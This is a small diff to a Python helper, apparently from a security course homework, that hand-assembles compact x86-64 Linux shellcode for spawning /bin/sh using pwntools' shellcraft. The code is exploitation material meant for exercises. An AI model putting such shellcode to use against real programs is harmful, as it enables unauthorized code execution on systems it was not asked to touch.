@@ -89,16 +89,20 @@ def nonull(src):
 
 ################################################################
 # TODO: This attempts to shrink the shellcode to at most length
-# len bytes.
+# len bytes. For Some reason we need to use rbx instead of rax which
+# allows for it to work on the test of homework2 task07 but not sure why
+# need to do further research on this
 ################################################################
 def compact():
     space = "    "
     raw = shellcraft.amd64.linux.sh()
-    print("TEST4: \n", raw[102:146])
-    original_code = raw[102:146]
+    # print("TEST4: \n", raw[102:146])
+    # original_code = raw[102:146]
+    original_code = space + "mov rbx, 0x68732f2f6e69622f" + newline
+    original_code += space + "push rbx" + newline
     shorten_code = newline + space + "xor esi, esi" + newline
     shorten_code += space + "push rsi" + newline
-    shorten_code += original_code + newline
+    shorten_code += original_code
     shorten_code += space + "push rsp" + newline
     shorten_code += space + "pop rdi" + newline
     shorten_code += space + "imul esi" + newline
